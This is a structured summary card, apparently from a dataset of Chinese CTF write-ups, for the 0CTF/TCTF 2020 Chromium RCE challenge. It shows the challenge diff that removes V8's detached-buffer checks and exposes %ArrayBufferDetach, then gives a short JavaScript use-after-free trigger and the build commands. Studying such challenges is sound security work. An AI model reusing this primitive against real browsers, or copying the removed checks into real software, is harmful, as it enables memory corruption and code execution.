---
title: 沙箱逃逸之0ctf2020 chromium_rce writeup
contest: 0CTF/TCTF 2020
year: 2020
difficulty: expert
vuln_type: rce
tags: [Chromium RCE, V8 typed-array-set, EnsureAttached去除, tcache, ArrayBufferDetach, 0day]
attack_chain: typed-array-set.tq移除EnsureAttached检查→typedarray不再验证buffer是否detached→%ArrayBufferDetach(a.buffer)释放a→a.set(b)写入freed mem→b.set(a)读取freed mem→tcache分配
key_payload: "var a = new Uint8Array(0x200); var b = new Uint8Array(0x200); %ArrayBufferDetach(a.buffer); a.set(b); b.set(a);EnsureAttached bypass;%ArrayBufferDetach intrinsic"
one_liner: 0CTF/TCTF 2020 Chromium RCE：typed-array-set bypass+ArrayBufferDetach+UAF tcache
lesson: V8 typed-array-set中EnsureAttached是关键安全检查；parser-base.h允许%ArrayBufferDetach intrinsic
quality: high
---

# 沙箱逃逸之0ctf2020_chromium_rce_writeup

**赛事**：0CTF/TCTF 2020 Chromium RCE（沙箱逃逸）

**diff核心改动**：

**1. `src/builtins/typed-array-set.tq`**：
```diff
- const utarget = typed_array::EnsureAttached(target) otherwise IsDetached;
+ const utarget = %RawDownCast<AttachedJSTypedArray>(target);

- const utypedArray = typed_array::EnsureAttached(typedArray) otherwise IsDetached;
+ const utypedArray = %RawDownCast<AttachedJSTypedArray>(typedArray);
```
- 移除EnsureAttached检查 → typedarray不再验证buffer是否detached

**2. `src/parsing/parser-base.h`**：
```diff
- if (flags().allow_natives_syntax() || extension_ != nullptr) {
-   return ParseV8Intrinsic();
- }
- break;
+ // Directly call %ArrayBufferDetach without --allow-native-syntax flag
+ return ParseV8Intrinsic();
```
- 允许直接调用 `%ArrayBufferDetach` intrinsic

**3. `src/parsing/parser.cc`**：
```cpp
+ if (function->function_id != Runtime::kArrayBufferDetach) {
+   return factory()->NewUndefinedLiteral(kNoSourcePosition);
+ }
```
- 限制：仅允许 `%ArrayBufferDetach` 调用，其他intrinsic返回undefined

**EXP**：
```javascript
var a = new Uint8Array(0x200);
var b = new Uint8Array(0x200);
%ArrayBufferDetach(a.buffer);  // a进入tcache
a.set(b);  // 写入freed mem
b.set(a);  // 读取freed mem
```

**漏洞利用**：
- `%ArrayBufferDetach(a.buffer)` 释放a的buffer
- buffer进入tcache（0x600 chunk）
- `a.set(b)` 绕过EnsureAttached检查 → 写入已freed mem
- `b.set(a)` 读取freed mem
- 实现UAF，进而可任意读写 → V8 sandbox escape → Chromium RCE

**构建命令**：
```bash
git checkout f7a1932ef928c190de32dd78246f75bd4ca8778b
gclient sync
git apply < ../tctf.diff
tools/dev/gm.py x64.release
tools/dev/gm.py x64.debug
```

**质量评估**：高（diff完整 + EXP + 漏洞原理清晰）
